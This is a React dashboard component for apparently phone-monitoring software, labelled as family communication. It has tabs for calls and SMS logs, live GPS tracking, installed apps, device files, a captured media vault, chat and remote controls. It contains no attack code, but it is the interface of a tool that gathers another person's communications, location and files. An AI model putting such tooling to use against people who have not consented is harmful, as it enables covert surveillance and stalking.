import React, { useState, useEffect } from 'react';
import {
  Activity,
  PhoneCall,
  MapPin,
  HardDrive,
  Sliders,
  MessageSquare,
  Image as ImageIcon,
  AppWindow,
  LayoutDashboard,
  Smartphone
} from 'lucide-react';
import OverviewDashboard from './OverviewDashboard';
import GpsMap from './GpsMap';
import TelemetryChart from './TelemetryChart';
import ControlPanel from './ControlPanel';
import MediaViewer from './MediaViewer';
import FamilyCommunication from './FamilyCommunication';
import DeviceFileExplorer from './DeviceFileExplorer';
import CallSmsExplorer from './CallSmsExplorer';
import InstalledAppsExplorer from './InstalledAppsExplorer';

export default function DashboardView({
  currentDevice,
  locations = [],
  logs = [],
  media = [],
  messages = [],
  files = [],
  callLogs = [],
  smsLogs = [],
  installedAppsData,
  onRequestDeleteDevice
}) {
  const [activeTab, setActiveTab] = useState('OVERVIEW'); // OVERVIEW, CALLS, MAP, APPS, FILES, MEDIA, CHAT, CONTROLS

  // Automatically scroll to the top whenever active tab changes
  useEffect(() => {
    try {
      window.scrollTo({
        top: 0,
        left: 0,
        behavior: 'smooth'
      });
    } catch {
      window.scrollTo(0, 0);
    }
  }, [activeTab]);

  const handleTabChange = (tabId) => {
    if (activeTab === tabId) {
      // Re-clicking the active menu smoothly scrolls back to top
      try {
        window.scrollTo({ top: 0, left: 0, behavior: 'smooth' });
      } catch {
        window.scrollTo(0, 0);
      }
    } else {
      setActiveTab(tabId);
    }
  };

  const deviceId = currentDevice?.deviceId || currentDevice?.id || 'dev_preview_nexus';
  const latestLocation = locations[0] || {};
  const storageInfo = currentDevice?.storageInfo || {
    totalStorageGB: 128.0,
    usedStorageGB: 46.2,
    freeStorageGB: 81.8,
    storagePercentUsed: 36,
    totalRamGB: 8.0,
    freeRamGB: 3.4
  };

  const navTabs = [
    { id: 'OVERVIEW', label: 'All Feeds', icon: LayoutDashboard },
    { id: 'CALLS', label: `Calls & SMS (${callLogs.length})`, icon: PhoneCall },
    { id: 'MAP', label: 'GPS Tracker', icon: MapPin },
    { id: 'APPS', label: `Apps (${installedAppsData?.totalCount || (installedAppsData?.apps?.length || 0)})`, icon: AppWindow },
    { id: 'FILES', label: `Files (${files.length})`, icon: HardDrive },
    { id: 'MEDIA', label: `Media Vault (${media.length})`, icon: ImageIcon },
    { id: 'CHAT', label: `Live Chat (${messages.length})`, icon: MessageSquare },
    { id: 'CONTROLS', label: 'Controls', icon: Sliders }
  ];

  return (
    <div className="space-y-4 sm:space-y-6">
      {/* Universal Desktop & Tablet Glassy Navigation Bar */}
      <div className="bg-slate-900/70 backdrop-blur-xl border border-slate-800/80 rounded-2xl p-1.5 shadow-2xl ring-1 ring-white/5">
        <div className="flex items-center space-x-1 overflow-x-auto scrollbar-none py-0.5">
          {navTabs.map(tab => {
            const Icon = tab.icon;
            const isActive = activeTab === tab.id;
            return (
              <button
                key={tab.id}
                onClick={() => handleTabChange(tab.id)}
                className={`flex items-center space-x-1.5 py-2 px-3 sm:px-3.5 rounded-xl text-xs font-semibold whitespace-nowrap transition-all touch-manipulation ${
                  isActive
                    ? 'bg-cyan-500 text-black shadow-lg shadow-cyan-500/20 font-bold scale-[1.02]'
                    : 'text-slate-400 hover:text-white hover:bg-slate-800/60'
                }`}
              >
                <Icon className={`w-3.5 h-3.5 sm:w-4 sm:h-4 shrink-0 ${isActive ? 'text-black' : 'text-slate-400'}`} />
                <span>{tab.label}</span>
              </button>
            );
          })}
        </div>
      </div>

      {/* Tab View Contents - Clean and Dedicated */}
      {!currentDevice ? (
        <div className="bg-slate-900/90 border border-slate-800 rounded-2xl p-8 sm:p-12 text-center max-w-lg mx-auto shadow-2xl my-8">
          <div className="w-16 h-16 rounded-2xl bg-slate-800/80 border border-slate-700 text-slate-400 flex items-center justify-center mx-auto mb-4">
            <Smartphone className="w-8 h-8 text-cyan-400" />
          </div>
          <h3 className="text-lg font-bold text-white mb-2">No Devices Registered</h3>
          <p className="text-xs text-slate-400 mb-6 leading-relaxed">
            All devices have been removed or no device has registered yet. Launch the companion app on your phone or check Firebase setup to connect a device.
          </p>
          <div className="px-3 py-1.5 bg-slate-950 rounded-xl border border-slate-800 text-xs font-mono text-cyan-400 inline-block">
            Listening for device connection...
          </div>
        </div>
      ) : (
      <div className="transition-all duration-200">
        {/* 1. All Feeds Overview (Tidy Executive Summary Dashboard) */}
        {activeTab === 'OVERVIEW' && (
          <OverviewDashboard
            currentDevice={currentDevice}
            locations={locations}
            logs={logs}
            media={media}
            messages={messages}
            files={files}
            callLogs={callLogs}
            smsLogs={smsLogs}
            installedAppsData={installedAppsData}
            onNavigateTab={handleTabChange}
            onRequestDeleteDevice={onRequestDeleteDevice}
          />
        )}

        {/* 2. Calls & SMS Supervision Page */}
        {activeTab === 'CALLS' && (
          <CallSmsExplorer
            deviceId={deviceId}
            callLogs={callLogs}
            smsLogs={smsLogs}
          />
        )}

        {/* 3. GPS Map, Telemetry, and History Page */}
        {activeTab === 'MAP' && (
          <div className="space-y-4 sm:space-y-6">
            <div className="bg-slate-900 border border-slate-800 rounded-2xl p-4 sm:p-6 shadow-xl">
              <div className="flex items-center justify-between pb-3 border-b border-slate-800 mb-4">
                <div className="flex items-center space-x-2">
                  <MapPin className="w-5 h-5 text-cyan-400" />
                  <h3 className="text-base font-bold text-white">Live OpenStreetMap GPS Tracking & Geofence</h3>
                </div>
                <span className="text-xs font-mono text-cyan-300">
                  {latestLocation.latitude ? `${latestLocation.latitude.toFixed(5)}, ${latestLocation.longitude?.toFixed(5)}` : 'Fixing GPS...'}
                </span>
              </div>
              <GpsMap locations={locations} currentDevice={currentDevice} />
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
              <div className="bg-slate-900 border border-slate-800 rounded-2xl p-4 shadow-xl">
                <h4 className="text-xs font-bold uppercase tracking-wider text-slate-400 mb-3 flex items-center space-x-2">
                  <Activity className="w-4 h-4 text-cyan-400" />
                  <span>Battery & Velocity Telemetry</span>
                </h4>
                <TelemetryChart locations={locations} />
              </div>

              <div className="bg-slate-900 border border-slate-800 rounded-2xl p-4 shadow-xl">
                <h4 className="text-xs font-bold uppercase tracking-wider text-slate-400 mb-3 flex items-center space-x-2">
                  <Activity className="w-4 h-4 text-purple-400" />
                  <span>Recent Location Breadcrumbs</span>
                </h4>
                <div className="space-y-2 max-h-56 overflow-y-auto pr-1">
                  {locations.slice(0, 15).map(loc => (
                    <div key={loc.id} className="p-2.5 rounded-xl bg-slate-950/60 border border-slate-800 flex items-center justify-between text-xs">
                      <div>
                        <div className="font-mono text-white font-semibold">
                          {loc.latitude?.toFixed(5)}, {loc.longitude?.toFixed(5)}
                        </div>
                        <div className="text-[10px] text-slate-400">
                          Speed: {(loc.speed || 0).toFixed(1)} km/h • Accuracy: ±{(loc.accuracy || 5).toFixed(1)}m
                        </div>
                      </div>
                      <span className="text-[10px] font-mono text-cyan-400">
                        {loc.batteryLevel}% ⚡
                      </span>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          </div>
        )}

        {/* 4. Installed Apps Page */}
        {activeTab === 'APPS' && (
          <InstalledAppsExplorer
            deviceId={deviceId}
            installedAppsData={installedAppsData}
          />
        )}

        {/* 5. Device File Explorer Page */}
        {activeTab === 'FILES' && (
          <DeviceFileExplorer
            deviceId={deviceId}
            files={files}
            storageInfo={storageInfo}
          />
        )}

        {/* 6. Captured Media Vault Page */}
        {activeTab === 'MEDIA' && (
          <MediaViewer
            media={media}
            deviceId={deviceId}
          />
        )}

        {/* 7. Family Communication & Live Chat Page */}
        {activeTab === 'CHAT' && (
          <FamilyCommunication
            currentDevice={currentDevice}
            messages={messages}
          />
        )}

        {/* 8. Remote Hardware Controls Page */}
        {activeTab === 'CONTROLS' && (
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-4 sm:gap-6">
            <div className="lg:col-span-2">
              <ControlPanel currentDevice={currentDevice} onRequestDeleteDevice={onRequestDeleteDevice} />
            </div>
            <div className="bg-slate-900 border border-slate-800 rounded-2xl p-4 sm:p-6 shadow-xl flex flex-col justify-between">
              <div>
                <h3 className="text-sm font-bold text-white mb-2 flex items-center space-x-2">
                  <Activity className="w-4 h-4 text-purple-400" />
                  <span>Real-time Audit Trail & Receipts</span>
                </h3>
                <p className="text-xs text-slate-400 mb-4">Command verification and service lifecycle</p>
                <div className="space-y-2 max-h-[480px] overflow-y-auto pr-1">
                  {logs.length === 0 ? (
                    <div className="text-xs text-slate-500 italic py-6 text-center">No audit logs recorded</div>
                  ) : (
                    logs.map(log => (
                      <div key={log.id} className="p-2.5 rounded-xl bg-slate-950/60 border border-slate-800 text-xs">
                        <div className="flex items-center justify-between">
                          <span className="font-semibold text-cyan-300 font-mono text-[11px] truncate max-w-[160px]">{log.eventType}</span>
                          <span className="text-[10px] text-slate-500">
                            {log.timestamp ? new Date(log.timestamp.toDate ? log.timestamp.toDate() : log.timestamp).toLocaleTimeString() : 'Live'}
                          </span>
                        </div>
                        <p className="text-slate-300 text-[11px] mt-1 break-words">{log.message}</p>
                      </div>
                    ))
                  )}
                </div>
              </div>
            </div>
          </div>
        )}
      </div>
      )}

      {/* Mobile Bottom Navigation Bar - Effortless Thumb Navigation */}
      <nav className="fixed bottom-0 left-0 right-0 z-40 bg-slate-900/90 backdrop-blur-2xl border-t border-slate-800/80 px-2 py-1.5 sm:hidden flex items-center justify-around shadow-[0_-8px_30px_rgba(0,0,0,0.7)]">
        {[
          { id: 'OVERVIEW', label: 'Feeds', icon: LayoutDashboard },
          { id: 'CALLS', label: 'Calls', icon: PhoneCall, count: callLogs.length },
          { id: 'MAP', label: 'GPS', icon: MapPin },
          { id: 'FILES', label: 'Files', icon: HardDrive, count: files.length },
          { id: 'MEDIA', label: 'Vault', icon: ImageIcon, count: media.length },
          { id: 'CHAT', label: 'Chat', icon: MessageSquare, count: messages.length },
          { id: 'CONTROLS', label: 'Controls', icon: Sliders }
        ].map(item => {
          const Icon = item.icon;
          const isActive = activeTab === item.id;
          return (
            <button
              key={item.id}
              onClick={() => handleTabChange(item.id)}
              className={`flex flex-col items-center justify-center py-1 px-1.5 rounded-xl transition-all relative ${
                isActive ? 'text-cyan-400 font-bold' : 'text-slate-400 hover:text-slate-200'
              }`}
            >
              <div className="relative">
                <Icon className={`w-4 h-4 ${isActive ? 'scale-110 drop-shadow-[0_0_8px_rgba(6,182,212,0.8)]' : ''}`} />
                {item.count > 0 && (
                  <span className="absolute -top-1.5 -right-2.5 min-w-[14px] h-3.5 px-0.5 bg-cyan-500 text-black text-[8px] font-bold rounded-full flex items-center justify-center">
                    {item.count > 99 ? '99+' : item.count}
                  </span>
                )}
              </div>
              <span className="text-[10px] mt-0.5 tracking-tight">{item.label}</span>
              {isActive && (
                <span className="w-1 h-1 rounded-full bg-cyan-400 mt-0.5" />
              )}
            </button>
          );
        })}
      </nav>
    </div>
  );
}
